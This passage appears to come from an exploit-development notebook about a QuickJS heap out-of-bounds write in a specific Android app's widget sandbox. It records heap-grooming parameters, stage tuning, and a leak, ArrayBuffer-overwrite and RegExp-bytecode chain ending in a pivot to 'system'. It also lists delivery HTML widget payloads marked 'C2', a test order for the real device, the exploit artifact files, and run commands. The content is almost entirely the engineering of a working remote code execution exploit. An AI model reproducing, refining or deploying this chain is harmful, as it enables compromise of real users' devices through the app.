  gets `memoryLimitBytes = 8 MiB`, `cpuLimitMs = 500`, `cpuQuotaMs = 300`,
  `cpuQuotaWindowMs = 1000`, `cpuKillAfterMs = 0`, `mainThreadQuotaMs = 100`,
  `maxTimers = 64`.  The 8 MiB is the renderer/options field, not the JS heap.
* The 72789 APK `assets/WidgetSandbox/WidgetJS/renderer-bundle.js` contains
  `Rn={memoryLimitBytes:8*1024*1024,cpuLimitMs:500,cpuQuotaMs:300,...}`;
  `sandbox-bundle.qbc` only carries the option names.  The native runtime
  wrapper is the authority for the JS heap.

**Consequence.** 8,171,152 > 6,291,456.  The first big allocation fails while
the heap is still mostly empty, so `JS_ThrowOutOfMemory` can allocate the error
object and the OOM is uncatchable; `eval(s1)` never returns, so no marker and
no stage2.  The observed "stays Ok" is exactly this failure mode.

**Correct 6 MiB profile (host-verified).**  The exact original stage1
`poc/poc_n1_ab_len.js` (no pre-stage JS objects, no diagnostic flags):

| parameter | value |
|---|---|
| `FILL1` | 6,074,000 |
| `T1` | 4,100 |
| `FILL2` | 5,876,128 |
| `T2` | 164,000 |
| `TD2` | -11,449 |
| `ND` | 1 |
| `B2B` | 1020 |

`ABLEN=1024`; leak `level=-45 idx=134 target=scopes-896`; AB write
`level=-11449 idx=1024 target=ABUF`.  Full chain proof 3/3 with the lab
scripts and 5/5 with the exact 6 MiB final payload.  Host CPU:

| case | CPU (net) | proof |
|---|---|---|
| 6 MiB stage1 (`poc_n1_ab_len.js`) | ~30-39 ms | — |
| 6 MiB full chain (lab lean s2/s3) | 48-51 ms | 3/3 |
| exact 6 MiB final payload scripts (`app3`, C-loaded) | **55.1 ms** (min 50.6, max 111.9 outlier) | 5/5 |

The 6 MiB stage1's parse OOM is caught as a bare null on host: the script
continues to the leak read and the AB stage.  OOM is uncatchable only when the
first big allocation exceeds the heap (the 8 MiB case).

**Wrapper-context caveat (important).**  The CPU/proof numbers above are the
single-file `app`/`app3` chain, where the stage source is C-loaded.  The widget
holds the s1 source as a JS string (`textContent`) and evals it; `app_stage`
returns the stage via `__stage(1)` as a JS string, matching the widget.  In
that context the single-file 6 MiB filler OOMs before the leak/AB:
`app_stage poc/poc_n1_ab_len.js ... wrap_min.js` gives
`InternalError: out of memory` 3/3, while the same file in `build/app` gives
`ABLEN=1024`.  The wrapper adds **~8,320 bytes** live at the big1 allocation
(measured: single big1 `used=206,240`, wrapper big1 `used=214,560`), and the
big fillers are page-rounded, so subtracting 8 KB from `FILL1`/`FILL2` does not
move the JS `malloc_size` at the critical parse point.  The compact 2,070-byte
stage1 (`gen_stage1_widget.py`) reduces the overhead but is not yet tuned to
`ABLEN=1024` in the wrapper either (`ABLEN=64` in the first single-file/wrapper
tests; `T2`/`T3` tuning is in progress).

Consequence: the `n1_lean6_*` widgets are **profile candidates, not
wrapper-verified**.  The s1 debug body `S1_START` and the F2/read/hb widgets
below are the diagnostic set for the next device run.  The next tuning must be
done with `app_stage` (JS-string source), not `app`/`app3`; the single-file
6 MiB numbers are a lower bound, not the widget result.

**Host procedure for the next tuning pass.**

1. `build/app s1.js` is only a sanity check (C-loaded source).  The widget
   proxy is `build/app_stage s1.js empty empty wrap_min.js`, where
   `wrap_min.js` is `try{eval(__stage(1))}catch(e){}` plus the ABLEN throw.
   Only `app_stage` returning `ABLEN=1024` counts for the widget.
2. Use `build/trace_stage` with the same wrapper to read `N1ABUF`, the
   `idx=1023` used/free, `N1PUSHFAIL`, the fake-pop level and the write
   target.  Compute `level = -(ABUF-scopes+4)/20` and adjust `ND` for the
   20-byte grid.
3. Prefer the compact 2,070-byte stage1 (`lab/gen_stage1_widget.py`): its
   wrapper source overhead is ~2.2 KB instead of ~8.3 KB.  Its `T2` large
   string is page-rounded; use the small `T3` ArrayBuffer for class-size
   steps (the first attempt at `T2=196,000` had 544 bytes of free at
   `idx=1023`, but `T3=500` moved the parse's 36 KB hash-table allocation
   and it died before idx 1023).
4. If the wrapper-context stage1 still cannot be stabilised, keep the F2
   probe as the on-device catchability oracle and use the experimental
   F2-auto-tuned AB-only branch (`gen_ab_only.py`) rather than spending the
   device budget on blind filler sweeps.

**Current 6 MiB files.**

| file | raw | zlib | contents |
|---|---|---|---|
| `n1_lean6_final_72879.html` | 17,444 | 6,741 | app 72879 constants, C2 |
| `n1_lean6_final_host.html` | 17,448 | 6,736 | host proof |
| `n1_lean6_debug_72879.html` | 18,292 | 7,049 | full debug, post-stage1 marks |
| `n1_lean6_s1_debug_72879.html` | 8,446 | **3,256** | s1-only, under 4 KiB |

The `n1_lean8_*` files are host-only artifacts from the wrong profile and must
not be used on 72879.

**F2 catchability.**  `n1_f2_probe_72879.html` is a standalone probe: it fills
class-80 `{}` objects to OOM, catches, frees, and marks
`F2=true:43335` at 6 MiB host (9.6 ms including the host harness).  It is the
first on-device F2 check and costs one 5-16 ms cycle.  A pre-flight F2 probe
**before** the stage1 is not compatible with the 20-byte heap window: the F2
filler/array churn perturbs the class-128 grooming; every FILL2 value tested
around 5.872-5.880 MB OOM'ed.  Adding `var E1,E2`, catch flags, a pre-`eval`
`localStorage` write, or even `var V={...}` before stage1 also breaks the
window.  The full F2-auto-tuned stage1 remains experimental; the delivered
stage1 is the exact original, whose parse OOM is catchable on host.

**Diagnostics that survive a dead stage1.**

* The 6 MiB s1/full debug bodies are static `S1_START`/`DBG_START`; the HTML
  parser renders them without JS, so they remain visible if `eval(s1)` dies.
  The final body stays `Ok`.
* `n1_hb_72879.html` writes `localStorage["N1MARK"]="HB"`;
  `n1_read_72879.html` only reads/displays `N1MARK` and runs **no** stage.
  Send HB, then read: `MARK=HB` means storage persists across widget messages;
  `MARK=null` means the sandbox resets/per-render storage and only the static
  body survives.
* A pre-`eval` `localStorage.setItem` inside the stage1 wrapper is not possible
  without breaking the stage1 window; keep the stage1 wrapper allocation-free.

**Next device test order.**

1. `n1_lean6_s1_debug_72879.html` (3,256 zlib).  The static body shows
   `S1_START`; if stage1 returns, it shows `S1B ABLEN=...`.  If it stays
   `S1_START`, stage1 died in the wrapper context (the expected outcome until
   the `app_stage` retune is finished, see the caveat above).
2. `n1_f2_probe_72879.html` (348 zlib) to verify the bare-null F2 catch on the
   device; `n1_hb_72879.html` + `n1_read_72879.html` to test storage
   persistence.
3. If s1 returns ABLEN=1024, `n1_lean6_debug_72879.html` (7,049 zlib) for
   `S2B TRIGGER=...`, `HOOKED`, `S3B FINAL=...` and the proof; then
   `n1_lean6_final_72879.html` for C2.
4. If s1 stays `S1_START`, the wrapper-context stage1 must be retuned on host
   with `app_stage` (JS-string source): start from the compact 2,070-byte
   stage1, adjust `T2` in page steps and the small `T3` ArrayBuffer in
   class-size steps, and measure the fake-pop target against `ABUF`; do not
   reuse the 8 MiB files.  The F2 probe can be used as the catchability
   oracle while tuning.

## 9. Negative results worth keeping

* **Embedded `def_scope_array`**: `scopes[-1].first` is `fd->scope_size`; a
  write of `idx` then `push_scope` overwrites `global_vars` with
  `0xffffffffffffffff`, and `js_free_function_def` dereferences it. Fatal, no
  controllable pointer.
* **Positive-level writes**: requires a mapped `scopes[level].first` read; large
  positive levels are an OOB read/SEGV.
* **20-byte grid**: `byte_length` needs `(ABUF-scopes-4) % 20 == 0`; the dummy
  class-64 padding fixes it. Moving the AB before the re-groom gave residue 16
  (off by 4).
* **OOM window**: the 1024-var stage needs the scopes growth 9 to fail; the
  working settings are `T1=4100, T2=164,000`; neighbours miss (growth succeeds
  or the vars array OOMs first).
* **Cross-arena path A**: not completed; the same-class path B was sufficient.
* **Scudo-only PoC**: the original ASan-style PoC returns a SyntaxError in this
  harness; allocator-dependent.

## 10. Artifacts

```
lab/qjs_n1/
  src/ src-trace/            quickjs snapshot / N1 trace instrumentation
  harness/app.c app2.c app3.c
  build/app app2 app3 trace trace2 asan scudo
  poc/poc_n1_asan_oob_write.js   ASan N1 write (filler 6,165,536)
  poc/poc_n1_leak.js             fake-parent leak (T.len=134)
  poc/poc_n1_ab_len.js           AB.byteLength 64 -> 1024
  poc/demo_oob.js                cross-object OOB RW (app2)
  poc/trigger_re.js              RegExp bytecode overwrite + victim trigger
  poc/demo_endgame.js            #1827 pivot + ctx/free resolver + system
  poc/demo_endgame_dbg.js        same with DBG/TRACE markers
  lab/gen.py lab/gen2.py         exploit generators
  logs/n1_rce_full.out           5/5 run output
  logs/n1_rce_5x.txt             reliability
  logs/n1_rce_proof.txt          id + N1RCE proof
  logs/demo_endgame_dbg.out      resolver trace
  logs/asan_n1_oob_write.log     ASan report
  logs/ab_len_layout.trace       class-72 block 38 / arena layout
  logs/demo_re_find.out          visible RegExp bytecode offsets
  logs/poc_n1_leak.trace         leak chain
  logs/poc_n1_ab_len.trace       level -11449 / ABUF target
  widget/n1_debug_72879.html     single-widget debug (DB, markers, 14,154/5,899)
  widget/n1_final_72879.html     single-widget final (DB, C2, 13,689/5,723)
  widget/n1_debug_72879_bot.html compact debug (bot-size, 8,782/3,535)
  widget/n1_final_72879_bot.html compact final (bot-size, 8,317/3,375)
  widget/n1_debug_host.html      host twin (JS_DEF_FREE 0x45940)
  widget/n1_final_host.html      host twin
  lab/gen_widget.py              widget generator (all tuning parameters)
  harness/app_stage.c            lazy-stage single-eval harness
  logs/widget_sizes.txt          raw/zlib measurements
  logs/widget_single_eval_marks.txt  structural and full single-eval marks
  widget/n1_persist_s1_72879.html    persistent debug, stage1 only
  widget/n1_persist_s12_72879.html   persistent debug, stage1+2
  widget/n1_persist_full_72879.html  persistent debug, full chain
  widget/n1_persist_clear_72879.html clear N1MARK
  widget/n1_persist_s1_compact_72879.html compact persistent stage1
  logs/widget_cpu_time.txt           host CPU measurements
  lab/gen_widget_persist.py          persistent debug generator
```

Quick commands:

```bash
cd lab/qjs_n1
./build/app  poc/poc_n1_ab_len.js
./build/app2 poc/poc_n1_ab_len.js poc/demo_oob.js
./build/app3 poc/poc_n1_ab_len.js poc/trigger_re.js poc/demo_endgame.js
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build/asan poc/poc_n1_asan_oob_write.js
```
